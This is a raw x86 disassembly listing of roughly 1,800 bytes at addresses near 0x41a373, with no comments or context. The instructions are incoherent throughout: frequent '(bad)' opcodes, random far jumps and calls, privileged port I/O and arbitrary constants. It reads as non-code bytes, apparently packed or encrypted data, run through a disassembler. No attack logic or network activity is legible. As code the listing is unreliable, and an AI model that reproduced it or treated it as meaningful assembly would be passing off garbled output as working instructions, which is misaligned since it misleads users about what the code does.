  41a373:	xchg   ebx,eax
  41a374:	aaa    
  41a375:	pop    ds
  41a376:	cdq    
  41a377:	dec    esi
  41a378:	rcl    DWORD PTR [edx-0x61],0x6e
  41a37c:	sbb    DWORD PTR ds:0x7b4d584f,0xffffff8e
  41a383:	pop    ecx
  41a384:	pop    esi
  41a385:	(bad)  
  41a386:	gs sbb esp,ecx
  41a389:	pop    ss
  41a38a:	xchg   esi,eax
  41a38b:	cwde   
  41a38c:	mov    bl,0xb7
  41a38e:	mov    ds:0x597d876c,al
  41a393:	jno    0x41a3f4
  41a395:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a396:	int3   
  41a397:	(bad)  
  41a398:	jmp    0x41a408
  41a39a:	cmp    ah,0x62
  41a39d:	aam    0x7d
  41a39f:	xchg   BYTE PTR [edx+edx*8-0x4],bl
  41a3a3:	fld    QWORD PTR [edx]
  41a3a5:	loope  0x41a3e6
  41a3a7:	sbb    eax,0xfbba2b6e
  41a3ac:	push   edx
  41a3ad:	les    edx,FWORD PTR [edi]
  41a3af:	xchg   esp,eax
  41a3b0:	xchg   BYTE PTR [edx+0x14fc9611],al
  41a3b6:	js     0x41a37c
  41a3b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a3b9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a3ba:	xor    eax,0x6a00b83a
  41a3bf:	mov    gs,WORD PTR [ecx-0x31]
  41a3c2:	ss dec ebp
  41a3c4:	(bad)  
  41a3c5:	sbb    eax,0xcfe4105
  41a3ca:	push   0x488eba36
  41a3cf:	mov    esp,0x3c45542f
  41a3d4:	fistp  WORD PTR [esi+0x28]
  41a3d7:	not    DWORD PTR [edx+edi*2]
  41a3da:	mov    dl,BYTE PTR [edi+0x59e0ff29]
  41a3e0:	cld    
  41a3e1:	inc    ecx
  41a3e2:	popf   
  41a3e3:	ret    
  41a3e4:	sti    
  41a3e5:	fs jg  0x41a39e
  41a3e8:	cdq    
  41a3e9:	ins    BYTE PTR es:[edi],dx
  41a3ea:	adc    al,0xf3
  41a3ec:	sub    al,0xd9
  41a3ee:	push   eax
  41a3ef:	ja     0x41a406
  41a3f1:	shl    BYTE PTR [esi-0x37],0xa1
  41a3f5:	pop    esp
  41a3f6:	cs int 0x2b
  41a3f9:	push   esp
  41a3fa:	cmp    al,0x36
  41a3fc:	retf   
  41a3fd:	push   0x1fca9fbe
  41a402:	daa    
  41a403:	mov    al,ds:0xe08c4f46
  41a408:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a409:	out    0xd8,eax
  41a40b:	and    BYTE PTR [ebx-0x4],0x4f
  41a40f:	jecxz  0x41a3db
  41a411:	mov    ebp,0x54c69825
  41a416:	int    0xf8
  41a418:	cld    
  41a419:	(bad)  
  41a41a:	adc    eax,0x4a28227d
  41a41f:	push   edx
  41a420:	dec    ecx
  41a421:	inc    ebp
  41a422:	loope  0x41a484
  41a424:	popa   
  41a425:	push   ss
  41a426:	mov    bh,0x44
  41a428:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a429:	lds    ecx,FWORD PTR [eax+0x60e0f2a5]
  41a42f:	lds    ebx,FWORD PTR [ecx-0x4cafe8f8]
  41a435:	mov    bh,0xa1
  41a437:	lods   al,BYTE PTR ds:[esi]
  41a438:	ins    BYTE PTR es:[edi],dx
  41a439:	je     0x41a495
  41a43b:	test   DWORD PTR [edx-0x54ffc12d],eax
  41a441:	xchg   si,ax
  41a443:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a444:	pop    eax
  41a445:	lea    ebp,[edx-0x68]
  41a448:	retf   
  41a449:	jbe    0x41a45a
  41a44b:	inc    ebp
  41a44c:	fsub   DWORD PTR [edx]
  41a44e:	inc    ebp
  41a44f:	dec    ebx
  41a450:	into   
  41a451:	cmp    BYTE PTR [ebx+0x5fff1533],0x19
  41a458:	jbe    0x41a488
  41a45a:	addr16 mov bh,0xa8
  41a45d:	and    eax,0x2721a24c
  41a462:	fst    DWORD PTR [ebx]
  41a464:	outs   dx,BYTE PTR ds:[esi]
  41a465:	and    esi,DWORD PTR [esi]
  41a467:	test   eax,0xe9a458d3
  41a46c:	dec    ebx
  41a46d:	xor    bl,BYTE PTR [ecx-0x7b011ee6]
  41a473:	inc    ebp
  41a474:	sar    DWORD PTR [bp+di],cl
  41a477:	xor    al,0xc2
  41a479:	mov    eax,ds:0xc62298fb
  41a47f:	daa    
  41a480:	mov    esp,0x730f6bf
  41a485:	inc    esp
  41a486:	fiadd  WORD PTR [ecx]
  41a488:	shr    DWORD PTR [edx+0x23962a0b],1
  41a48e:	aam    0x18
  41a490:	mov    ebx,0xab297d37
  41a495:	rcr    cl,cl
  41a497:	lods   eax,DWORD PTR ds:[esi]
  41a498:	cmc    
  41a499:	cmp    al,0x93
  41a49b:	hlt    
  41a49c:	jmp    0x2112:0x3d403406
  41a4a3:	push   edx
  41a4a4:	into   
  41a4a5:	jae    0x41a43a
  41a4a7:	jmp    0x41a4ec
  41a4a9:	aam    0x51
  41a4ab:	fst    QWORD PTR [esi+0x64]
  41a4ae:	fcomp  DWORD PTR [edx]
  41a4b0:	lds    edi,FWORD PTR [edi]
  41a4b2:	mov    cl,0x95
  41a4b4:	pusha  
  41a4b5:	fwait
  41a4b6:	loope  0x41a446
  41a4b8:	ffreep st(0)
  41a4ba:	inc    ebp
  41a4bb:	fdivr  DWORD PTR [edi]
  41a4bd:	pop    edi
  41a4be:	xchg   esp,eax
  41a4bf:	aad    0x38
  41a4c1:	and    edi,DWORD PTR [edi]
  41a4c3:	repz jbe 0x41a52f
  41a4c6:	iret   
  41a4c7:	sub    eax,0xd3599257
  41a4cc:	hlt    
  41a4cd:	mov    cl,BYTE PTR [ebx+0x2d]
  41a4d0:	fsub   st(6),st
  41a4d2:	fist   WORD PTR [edx+0xf611f9b]
  41a4d8:	shl    ebx,cl
  41a4da:	adc    DWORD PTR [ebx+0x711b4f94],0x7ebb79f4
  41a4e4:	sbb    DWORD PTR [ebx+0x46a0f2f7],ebp
  41a4ea:	push   es
  41a4eb:	stc    
  41a4ec:	sbb    BYTE PTR ds:0x40478ad6,bh
  41a4f2:	out    dx,al
  41a4f3:	in     eax,0x54
  41a4f5:	mov    bl,0xcc
  41a4f7:	and    BYTE PTR [esi+edi*8],bh
  41a4fa:	in     al,dx
  41a4fb:	mov    edi,0xd54faa5e
  41a501:	push   esi
  41a502:	ds hlt 
  41a504:	dec    ecx
  41a505:	dec    edi
  41a506:	bound  esi,QWORD PTR [ebx-0x7d]
  41a509:	cmp    esp,esp
  41a50b:	and    al,0x77
  41a50d:	fiadd  DWORD PTR [eax+eiz*2-0x5823a40]
  41a514:	mov    edx,0x1fbcdfea
  41a519:	jge    0x41a4e4
  41a51b:	int3   
  41a51c:	cwde   
  41a51d:	xor    eax,0x10e5cd4d
  41a522:	test   DWORD PTR [eax+0x62],0x807fc49c
  41a529:	dec    edi
  41a52a:	shl    BYTE PTR es:[ecx+edx*2+0x2d5e6b08],1
  41a532:	test   ecx,esp
  41a534:	call   0xbed2:0x89f6f1b8
  41a53b:	mov    ecx,0x2d25b42e
  41a540:	icebp  
  41a541:	add    DWORD PTR [ebx+0x4ace048b],0xcc5702ed
  41a54b:	mov    ebp,DWORD PTR [ebx+edx*4-0x6fff84c]
  41a552:	(bad)  
  41a553:	fsub   DWORD PTR [esi+edi*2]
  41a556:	ret    0x8f8b
  41a559:	or     esi,DWORD PTR [esp+ecx*1-0x3ec6f10b]
  41a560:	or     al,0xe2
  41a562:	sahf   
  41a563:	mov    ebp,0x83113cba
  41a568:	pop    esi
  41a569:	xlat   BYTE PTR ds:[ebx]
  41a56a:	xchg   BYTE PTR [ebp+eax*4+0x1d],al
  41a56e:	push   ecx
  41a56f:	dec    edx
  41a570:	mov    edx,0x7ea2bff1
  41a575:	jo     0x41a5d5
  41a577:	pop    ecx
  41a578:	or     eax,0xe3ee19ac
  41a57d:	mov    cl,0x1e
  41a57f:	repnz mov ds:0x55358bbd,eax
  41a585:	push   ebp
  41a586:	int3   
  41a587:	repnz and eax,0x69c606ed
  41a58d:	out    0x76,eax
  41a58f:	push   0xffffff97
  41a591:	push   es
  41a592:	mov    es,WORD PTR [edi+0x6f468041]
  41a598:	xchg   BYTE PTR ds:0xfcfc8d6a,dl
  41a59e:	inc    ebx
  41a59f:	adc    DWORD PTR ds:0x34404839,eax
  41a5a5:	xchg   ecx,eax
  41a5a6:	pop    ds
  41a5a7:	or     eax,ebp
  41a5a9:	(bad)  
  41a5aa:	fldenv [edx]
  41a5ac:	xchg   edx,eax
  41a5ad:	mov    edx,0x7a6d7d7b
  41a5b2:	loop   0x41a5ef
  41a5b4:	cli    
  41a5b5:	cmp    al,0x8b
  41a5b7:	cmp    eax,0x231f306e
  41a5bc:	cmp    al,0x4c
  41a5be:	icebp  
  41a5bf:	imul   ecx,DWORD PTR cs:[ebp+0x795a034],0x8d4c6cfa
  41a5ca:	rcr    DWORD PTR [edx-0x51dde5f7],1
  41a5d0:	pop    edi
  41a5d1:	add    bh,BYTE PTR [edi+0x16]
  41a5d4:	xchg   ebp,edx
  41a5d6:	sar    BYTE PTR [edx],cl
  41a5d8:	or     BYTE PTR [esi],bl
  41a5da:	push   edi
  41a5db:	inc    ecx
  41a5dc:	inc    esp
  41a5dd:	xchg   DWORD PTR [esi+0x4a59460e],edi
  41a5e3:	push   edx
  41a5e4:	lea    eax,[edx-0x156dbf1f]
  41a5ea:	rol    DWORD PTR [eax-0x1863c3ad],0x58
  41a5f1:	and    ch,cl
  41a5f3:	jmp    0x2384:0x4a2638cb
  41a5fa:	ja     0x41a585
  41a5fc:	(bad)  
  41a5fd:	cmp    al,0xf
  41a5ff:	aas    
  41a600:	push   cs
  41a601:	std    
  41a602:	loop   0x41a62a
  41a604:	cmp    al,0xab
  41a606:	sbb    edx,DWORD PTR [eax-0x78]
  41a609:	mov    dh,0xba
  41a60b:	enter  0x8686,0x7f
  41a60f:	or     eax,0x638298c1
  41a614:	dec    esi
  41a615:	xchg   DWORD PTR [edi],esp
  41a617:	inc    edx
  41a618:	push   es
  41a619:	je     0x41a601
  41a61b:	pop    ebx
  41a61c:	cmp    cl,BYTE PTR [edi]
  41a61e:	call   0x975489e9
  41a623:	mov    ch,0xcc
  41a625:	lahf   
  41a626:	clc    
  41a627:	add    cl,BYTE PTR [esi]
  41a629:	mul    DWORD PTR [edi-0xe]
  41a62c:	outs   dx,DWORD PTR ds:[esi]
  41a62d:	xchg   ecx,eax
  41a62e:	xchg   ecx,eax
  41a62f:	lods   al,BYTE PTR ds:[esi]
  41a630:	sub    BYTE PTR [esi-0x78570ef7],bl
  41a636:	lods   al,BYTE PTR ds:[esi]
  41a637:	push   es
  41a638:	sbb    al,0x39
  41a63a:	fwait
  41a63b:	jl     0x41a669
  41a63d:	push   0xb0001102
  41a642:	pop    es
  41a643:	xor    DWORD PTR [ebx],ebx
  41a645:	lods   eax,DWORD PTR ds:[esi]
  41a646:	hlt    
  41a647:	popf   
  41a648:	test   eax,0xd4cc11e1
  41a64d:	or     ebx,0xd7230e76
  41a653:	test   eax,0xf8cfca8f
  41a658:	xlat   BYTE PTR ds:[ebx]
  41a659:	pop    esp
  41a65a:	jb     0x41a63f
  41a65c:	xor    bh,BYTE PTR [eax-0x78fe1c17]
  41a662:	lock fldlg2 
  41a665:	outs   dx,BYTE PTR ds:[esi]
  41a666:	scas   eax,DWORD PTR es:[edi]
  41a667:	cmp    BYTE PTR [edx+0x44],dl
  41a66a:	and    al,dh
  41a66c:	popf   
  41a66d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a66e:	add    al,0xd7
  41a670:	stos   BYTE PTR es:[edi],al
  41a671:	aad    0x44
  41a673:	scas   eax,DWORD PTR es:[edi]
  41a674:	aad    0xaf
  41a676:	sbb    BYTE PTR [edi+esi*2],al
  41a679:	mov    WORD PTR [edi],?
  41a67b:	ret    0xbb98
  41a67e:	push   edx
  41a67f:	mov    eax,0x48e8852a
  41a684:	inc    edi
  41a685:	inc    edi
  41a686:	test   edx,edi
  41a688:	in     al,0xdf
  41a68a:	aam    0xf4
  41a68c:	std    
  41a68d:	mov    bl,0xe8
  41a68f:	arpl   WORD PTR [ebx+0x50],bx
  41a692:	jl     0x41a6aa
  41a694:	mov    DWORD PTR [edi],edx
  41a696:	jmp    0x24a2ebc7
  41a69b:	mov    dl,BYTE PTR [esi]
  41a69d:	jno    0x41a6f3
  41a69f:	ja     0x41a6a7
  41a6a1:	jp     0x41a6b4
  41a6a3:	ins    BYTE PTR es:[edi],dx
  41a6a4:	xor    esp,DWORD PTR [edi]
  41a6a6:	cld    
  41a6a7:	and    eax,0x3387ba50
  41a6ac:	dec    ebx
  41a6ad:	cmp    cl,BYTE PTR [edx+0x6de02c14]
  41a6b3:	dec    eax
  41a6b4:	gs aaa 
  41a6b6:	das    
  41a6b7:	xor    al,0xff
  41a6b9:	in     eax,0x2e
  41a6bb:	retf   
  41a6bc:	fsubp  st(7),st
  41a6be:	outs   dx,DWORD PTR ds:[esi]
  41a6bf:	xor    cl,BYTE PTR [esi]
  41a6c1:	and    dh,BYTE PTR [esi+0x59ef8a7d]
  41a6c7:	or     edi,eax
  41a6c9:	push   ecx
  41a6ca:	push   ebx
  41a6cb:	paddb  mm7,mm0
  41a6ce:	mov    BYTE PTR [eax+0x77],dl
  41a6d1:	xchg   esi,eax
  41a6d2:	(bad)  
  41a6d3:	xor    DWORD PTR [edi],ecx
  41a6d5:	cwde   
  41a6d6:	das    
  41a6d7:	jle    0x41a6ff
  41a6d9:	fstp   TBYTE PTR [esi]
  41a6db:	mov    dh,0x80
  41a6dd:	std    
  41a6de:	mov    al,0x4b
  41a6e0:	dec    esi
  41a6e1:	(bad)  
  41a6e2:	shl    DWORD PTR [edi-0x69],1
  41a6e5:	test   DWORD PTR ds:0xc801563a,ecx
  41a6eb:	clc    
  41a6ec:	repnz cdq 
  41a6ee:	cmp    al,0xef
  41a6f0:	mov    esp,0x8eb32ca4
  41a6f5:	push   ecx
  41a6f6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a6f7:	out    0x1d,eax
  41a6f9:	pshufw mm7,mm5,0x73
  41a6fd:	xor    dh,cl
  41a6ff:	mov    edx,0x3460d04a
  41a704:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a705:	or     ch,bl
  41a707:	mov    dl,0xb3
  41a709:	lds    eax,FWORD PTR [eax+0x3c]
  41a70c:	sti    
  41a70d:	adc    ch,BYTE PTR [eax+eiz*1-0x724744]
  41a714:	add    al,0x8d
  41a716:	in     al,0xcf
  41a718:	jb     0x41a751
  41a71a:	(bad)  
  41a71b:	mov    ebx,0x3d2473c6
  41a720:	dec    ecx
  41a721:	fwait
  41a722:	retf   0x422c
  41a725:	test   ebx,0x1762129b
  41a72b:	clc    
  41a72c:	ficom  DWORD PTR [edi+0x2]
  41a72f:	sub    eax,esi
  41a731:	ds je  0x41a7a8
  41a734:	fimul  DWORD PTR [edi-0x58007745]
  41a73a:	adc    eax,DWORD PTR [edx]
  41a73c:	xor    eax,0xa5d51c03
  41a741:	xchg   ebx,eax
  41a742:	cmp    eax,0xbea204b4
  41a747:	dec    edi
  41a748:	lods   al,BYTE PTR ds:[esi]
  41a749:	cmp    eax,0xcc4070f2
  41a74e:	mov    ch,0x7
  41a750:	rcr    BYTE PTR [ebp+0x7dc1b785],0x93
  41a757:	pusha  
  41a758:	push   ds
  41a759:	lea    ecx,[ebx]
  41a75b:	jno    0x41a779
  41a75d:	adc    BYTE PTR [edi-0xd],cl
  41a760:	das    
  41a761:	js     0x41a73e
  41a763:	add    DWORD PTR [ebp+0x3],ebx
  41a766:	pop    ds
  41a767:	jmp    0x41a730
  41a769:	pushf  
  41a76a:	inc    esi
  41a76b:	pop    edi
  41a76c:	sbb    BYTE PTR [eax+0x74],0x5c
  41a770:	test   DWORD PTR [ecx],ebx
  41a772:	pop    edx
  41a773:	mov    eax,0x7a22c10b
  41a778:	add    eax,0xd0d7f659
  41a77d:	mov    ecx,0x159a6e42
  41a782:	push   ebp
  41a783:	idiv   cl
  41a785:	jge    0x41a743
  41a787:	mov    dl,0x2f
  41a789:	cmp    al,0xfc
  41a78b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a78c:	push   edx
  41a78d:	push   ecx
  41a78e:	iret   
  41a78f:	fld    st(7)
  41a791:	mov    ah,0x47
  41a793:	call   0xf975:0xbbc03be6
  41a79a:	mov    edi,0xf7bd3ca
  41a7a0:	lock jle 0x41a822
  41a7a3:	pop    es
  41a7a4:	sub    DWORD PTR [eax],ebx
  41a7a6:	rol    BYTE PTR [ebp-0x33],1
  41a7a9:	add    eax,0x803a14a1
  41a7ae:	stos   BYTE PTR es:[edi],al
  41a7af:	ror    DWORD PTR [ecx-0x2fed3adf],0x9e
  41a7b6:	mov    WORD PTR [ecx-0x34],fs
  41a7b9:	xchg   DWORD PTR [ebx+edx*1-0x5b],edi
  41a7bd:	dec    esp
  41a7be:	mov    bh,0x97
  41a7c0:	add    BYTE PTR [esi-0x28d9cb7f],cl
  41a7c6:	jmp    0x727af1a1
  41a7cb:	jle    0x41a76c
  41a7cd:	push   0x60d8f098
  41a7d2:	xor    BYTE PTR [ecx+edx*1],bh
  41a7d5:	aaa    
  41a7d6:	retf   0xbb09
  41a7d9:	xor    BYTE PTR [ebp+0x1c9ebb66],0xb5
  41a7e0:	jp     0x41a787
  41a7e2:	int    0x98
  41a7e4:	outs   dx,DWORD PTR ds:[esi]
  41a7e5:	push   esp
  41a7e6:	loopne 0x41a808
  41a7e8:	mov    cl,0x73
  41a7ea:	adc    al,cl
  41a7ec:	fstp   TBYTE PTR [edx]
  41a7ee:	cmp    dl,0xf6
  41a7f1:	sbb    dl,BYTE PTR [ebx-0x7f]
  41a7f4:	cld    
  41a7f5:	pop    esi
  41a7f6:	aaa    
  41a7f7:	sti    
  41a7f8:	repnz pusha 
  41a7fa:	mov    dl,0x8a
  41a7fc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a7fd:	add    DWORD PTR [eax-0x52],ecx
  41a800:	shl    ebp,0x65
  41a803:	mov    ebp,0x9a74d6c7
  41a808:	hlt    
  41a809:	xor    BYTE PTR [ecx],dl
  41a80b:	xor    eax,DWORD PTR [ebx-0x45]
  41a80e:	in     eax,0xcc
  41a810:	push   edx
  41a811:	xlat   BYTE PTR ds:[ebx]
  41a812:	inc    eax
  41a813:	sub    eax,0x13b8a446
  41a818:	ins    DWORD PTR es:[edi],dx
  41a819:	add    DWORD PTR [esi+edi*4-0x5e],0xffffffca
  41a81e:	test   eax,0xfdec3fb6
  41a823:	xchg   esp,eax
  41a824:	jge    0x41a868
  41a826:	fiadd  WORD PTR [eax+0x59ea01dd]
  41a82c:	inc    esp
  41a82d:	in     eax,0x60
  41a82f:	shl    DWORD PTR [ecx+0x27],cl
  41a832:	lds    edi,FWORD PTR [ebx]
  41a834:	or     al,0x67
  41a836:	mov    WORD PTR [edi],fs
  41a838:	add    cl,bl
  41a83a:	ret    
  41a83b:	sahf   
  41a83c:	and    al,0xd1
  41a83e:	imul   edx,DWORD PTR [esi],0x7
  41a841:	icebp  
  41a842:	mov    eax,0xb4c013ec
  41a847:	es inc eax
  41a849:	ja     0x41a823
  41a84b:	mov    al,0x22
  41a84d:	(bad)  
  41a84e:	dec    edi
  41a84f:	loopne 0x41a806
  41a851:	add    DWORD PTR [ebx],edx
  41a853:	cmp    al,0xed
  41a855:	pop    esi
  41a856:	mov    WORD PTR [eax],ds
  41a858:	iret   
  41a859:	popf   
  41a85a:	jg     0x41a8a6
  41a85c:	or     al,0xc0
  41a85e:	jnp    0x41a8c5
  41a860:	pop    ds
  41a861:	xchg   ecx,eax
  41a862:	sub    DWORD PTR cs:[ecx],0xffffff9a
  41a866:	rcr    BYTE PTR [ebx+0x4db742ee],1
  41a86c:	mov    ebp,0xe7c1a964
  41a871:	and    edi,DWORD PTR [edx+eax*1+0x7562a8a9]
  41a878:	adc    BYTE PTR [eax+eiz*1-0x2e],al
  41a87c:	les    esp,FWORD PTR [ecx-0x785f4450]
  41a882:	xor    esp,DWORD PTR [ecx-0x6a4e915d]
  41a888:	dec    ebp
  41a889:	or     edx,DWORD PTR [esi]
  41a88b:	das    
  41a88c:	xchg   BYTE PTR [esi],dh
  41a88e:	sub    bl,BYTE PTR [esi]
  41a890:	or     al,0xea
  41a892:	mov    al,ch
  41a894:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a895:	scas   eax,DWORD PTR es:[edi]
  41a896:	or     DWORD PTR [ebx+esi*2+0x2c9c1422],esp
  41a89d:	ror    DWORD PTR [ecx],0x6a
  41a8a0:	je     0x41a84f
  41a8a2:	daa    
  41a8a3:	and    DWORD PTR [ebx-0x10caa80b],edx
  41a8a9:	inc    eax
  41a8aa:	fnsetpm(287 only) 
  41a8ac:	loop   0x41a90d
  41a8ae:	add    BYTE PTR [edx-0x18],cl
  41a8b1:	inc    esi
  41a8b2:	adc    edx,DWORD PTR [eax-0x48bc860]
  41a8b8:	iret   
  41a8b9:	jecxz  0x41a854
  41a8bb:	mov    ch,0xc6
  41a8bd:	std    
  41a8be:	cmp    eax,0x1490d24f
  41a8c3:	sahf   
  41a8c4:	mov    dl,BYTE PTR [esp+ebx*1+0xc]
  41a8c8:	mov    ebp,0x2ec3a612
  41a8cd:	in     al,dx
  41a8ce:	rol    DWORD PTR [ebx+0x203f546b],1
  41a8d4:	dec    esi
  41a8d5:	dec    eax
  41a8d6:	xchg   ecx,eax
  41a8d7:	xchg   ebx,eax
  41a8d8:	ffree  st(5)
  41a8da:	dec    ecx
  41a8db:	into   
  41a8dc:	leave  
  41a8dd:	xor    eax,0xb0a43282
  41a8e2:	fadd   DWORD PTR [esi-0x3c]
  41a8e5:	or     DWORD PTR [ecx],edx
  41a8e7:	and    edx,esp
  41a8e9:	idiv   DWORD PTR [edx+0x5e221f17]
  41a8ef:	sar    BYTE PTR [edi+0x26],1
  41a8f2:	into   
  41a8f3:	xor    ebx,DWORD PTR [eax+0x3aa262d6]
  41a8f9:	or     ch,ah
  41a8fb:	(bad)  
  41a8fd:	jecxz  0x41a8aa
  41a8ff:	lds    ebx,FWORD PTR [ebx+0x18]
  41a902:	adc    esi,edx
  41a904:	xor    al,0x45
  41a906:	and    cl,BYTE PTR [esp+ebx*1+0x41f9d0c8]
  41a90d:	xor    BYTE PTR [ebp+0x155eb664],dl
  41a913:	pop    ebp
  41a914:	or     al,0x7
  41a916:	es (bad) 
  41a918:	mov    cl,0x7b
  41a91a:	and    esi,ecx
  41a91c:	push   es
  41a91d:	adc    eax,0x5234eec0
  41a922:	imul   edi,DWORD PTR [ecx-0x48b0cfab],0xffffffdf
  41a929:	out    dx,al
  41a92a:	fmul   DWORD PTR [edx-0x4e46f0bd]
  41a930:	data16 xor al,0xd5
  41a933:	mov    eax,0x7a25dce0
  41a938:	sbb    eax,0xd63ba27f
  41a93d:	call   0x4bc43c60
  41a942:	fiadd  DWORD PTR [eax-0x78]
  41a945:	data16 fwait
  41a947:	shr    BYTE PTR [ecx],1
  41a949:	xor    al,0x2e
  41a94b:	jecxz  0x41a999
  41a94d:	mov    eax,ds:0x9a77f1ed
  41a952:	out    dx,eax
  41a953:	outs   dx,DWORD PTR ds:[esi]
  41a954:	scas   al,BYTE PTR es:[edi]
  41a955:	pop    esp
  41a956:	sub    dl,BYTE PTR [ebp-0x9]
  41a959:	test   al,0xd
  41a95b:	scas   eax,DWORD PTR es:[edi]
  41a95c:	test   DWORD PTR [ebx+0x16],0xf8cd6b84
  41a963:	dec    esi
  41a964:	aas    
  41a965:	(bad)  
  41a967:	sub    edi,DWORD PTR [esi]
  41a969:	ret    
  41a96a:	push   DWORD PTR [ecx-0x7c]
  41a96d:	mov    cl,0xfd
  41a96f:	xor    esp,edx
  41a971:	sub    DWORD PTR [eax-0x47],edi
  41a974:	fstp   QWORD PTR [edi]
  41a976:	outs   dx,BYTE PTR ds:[esi]
  41a977:	repz mov ax,0x7dde
  41a97c:	mov    fs,edx
  41a97e:	out    dx,eax
  41a97f:	sub    al,0xd3
  41a981:	pop    eax
  41a982:	mov    al,0x3d
  41a984:	jne    0x41a9a0
  41a986:	cdq    
  41a987:	(bad)  
  41a988:	fisub  WORD PTR [edi+eax*1]
  41a98b:	jb     0x41a954
  41a98d:	ins    BYTE PTR es:[edi],dx
  41a98e:	(bad)  
  41a98f:	ins    BYTE PTR es:[edi],dx
  41a990:	adc    al,0x31
  41a992:	arpl   WORD PTR [edi],sp
  41a994:	xor    al,0x45
  41a997:	scas   eax,DWORD PTR es:[edi]
  41a998:	stc    
  41a999:	push   0xd6c1f0c6
  41a99e:	add    ebp,DWORD PTR [ebx-0x202b9f01]
  41a9a4:	pop    ebp
  41a9a5:	mov    DWORD PTR [edx-0x40],esi
  41a9a8:	jg     0x41a94f
  41a9aa:	pop    eax
  41a9ab:	data16 or al,0xa1
  41a9ae:	inc    ecx
  41a9af:	ret    
  41a9b0:	mov    cl,0x24
  41a9b2:	cmp    dl,BYTE PTR [edx+0x73]
  41a9b5:	fimul  DWORD PTR [esi+ebx*1+0x6d]
  41a9b9:	xor    al,0xb4
  41a9bb:	push   ebx
  41a9bc:	stos   BYTE PTR es:[edi],al
  41a9bd:	iret   
  41a9be:	lock sbb BYTE PTR [edx-0x9870c74],dh
  41a9c5:	leave  
  41a9c6:	retf   
  41a9c7:	dec    ebp
  41a9c8:	cmp    al,0xc1
  41a9ca:	repnz adc edi,DWORD PTR [ebp-0x2c735400]
  41a9d1:	cmp    dh,bh
  41a9d3:	push   eax
  41a9d4:	mov    eax,DWORD PTR [edi]
  41a9d6:	cmp    eax,0x98730767
  41a9db:	jae    0x41aa59
  41a9dd:	fwait
  41a9de:	jecxz  0x41a96c
  41a9e0:	cmp    ebp,eax
  41a9e2:	cs jb  0x41a9ba
  41a9e5:	ret    0x2eec
  41a9e8:	ins    BYTE PTR es:[edi],dx
  41a9e9:	popa   
  41a9ea:	adc    ch,BYTE PTR [ebx+0x38]
  41a9ed:	xor    DWORD PTR [eax-0x41],edx
  41a9f0:	and    DWORD PTR [edi-0x46],0xa14f7cad
  41a9f7:	xor    DWORD PTR [esi+ebx*1],esp
  41a9fa:	pop    ecx
  41a9fb:	lea    esp,[edx]
  41a9fd:	xchg   esi,eax
  41a9fe:	xlat   BYTE PTR ds:[ebx]
  41a9ff:	mov    ds:0x1576d8bd,al
  41aa04:	mov    esp,0x799b1550
  41aa09:	xor    ch,BYTE PTR [ecx+0x2a]
  41aa0c:	shr    bl,0xe2
  41aa0f:	adc    edi,DWORD PTR [edi+ebx*8]
  41aa12:	push   0x26
  41aa14:	dec    edx
  41aa15:	sub    ah,cl
  41aa17:	inc    edx
  41aa18:	mov    edx,0x75c962a2
  41aa1d:	nop
  41aa1e:	pop    ebp
  41aa1f:	test   al,0x65
  41aa21:	shr    BYTE PTR [ebp+0x1f],cl
  41aa24:	mov    ds:0xf9c54793,eax
  41aa29:	lods   al,BYTE PTR ds:[esi]
  41aa2a:	imul   eax,DWORD PTR [edx],0x6d2d7c37
  41aa30:	sar    dl,cl
  41aa32:	adc    ah,BYTE PTR [ebp-0x75]
  41aa35:	imul   edx,DWORD PTR [esi+ebp*4-0x34],0xffffffcc
  41aa3a:	xchg   BYTE PTR [esp+ebx*2-0x1d9443f9],ah
  41aa41:	sbb    ch,cl
  41aa43:	aad    0xf9
  41aa45:	dec    edi
  41aa46:	aam    0xa7
  41aa48:	jne    0x41aac6
  41aa4a:	inc    eax
  41aa4b:	pop    esi
  41aa4c:	in     al,0x3e
  41aa4e:	jg     0x41aa5a
  41aa50:	fstp   st(3)
  41aa52:	das    
  41aa53:	xor    al,0x55
  41aa55:	and    BYTE PTR es:[ebx-0x727062d2],ah
  41aa5c:	in     al,0x9
  41aa5e:	xchg   esp,eax
  41aa5f:	sub    eax,0x4ad59422
  41aa64:	fidiv  DWORD PTR [eax]
  41aa66:	sbb    BYTE PTR [edx-0x2534e9be],bh
  41aa6c:	test   al,0x72
  41aa6e:	mov    ebp,DWORD PTR [esi+0x35]
  41aa71:	add    DWORD PTR [ebx+edi*1],eax
  41aa74:	mov    edx,0x89102a6
  41aa79:	lea    ebx,[esi+0x3a]
  41aa7c:	int    0xe
  41aa7e:	or     DWORD PTR [edx],edx
  41aa80:	mov    al,0x56
  41aa82:	call   0x7779d7c2
  41aa87:	out    0x96,eax
  41aa89:	mov    bh,0x86
  41aa8b:	fdivr  QWORD PTR [ebp-0x2]
  41aa8e:	push   ebx
  41aa8f:	cs xchg bh,al
  41aa92:	xchg   ebx,eax
  41aa93:	jne    0x41aa4c
  41aa95:	test   DWORD PTR [ebx-0x9],edx
  41aa98:	jmp    0xbb80:0xb2fbf07a
  41aa9f:	in     al,dx
  41aaa0:	mov    eax,ds:0x5e2b7f97
  41aaa5:	sbb    al,0x47
  41aaa7:	push   esi
  41aaa8:	popf   
  41aaa9:	add    DWORD PTR [ebx-0xdd231e6],esi
  41aaaf:	add    DWORD PTR [edx],edi
  41aab1:	jae    0x41aaf0
  41aab3:	leave  
  41aab4:	sub    eax,0x7ebd3bd1
  41aab9:	mov    bl,0xc4
  41aabb:	mov    ecx,0x531a0326
  41aac0:	fnstcw WORD PTR [ecx-0x3c]
  41aac3:	mov    al,ds:0xb2404cda
  41aac8:	rcr    esi,0x8e
  41aacb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41aacc:	push   eax
  41aacd:	nop
  41aace:	or     al,0x59
  41aad0:	mov    ebp,0xdf39c81b
  41aad5:	mov    ds:0x21c03eda,al
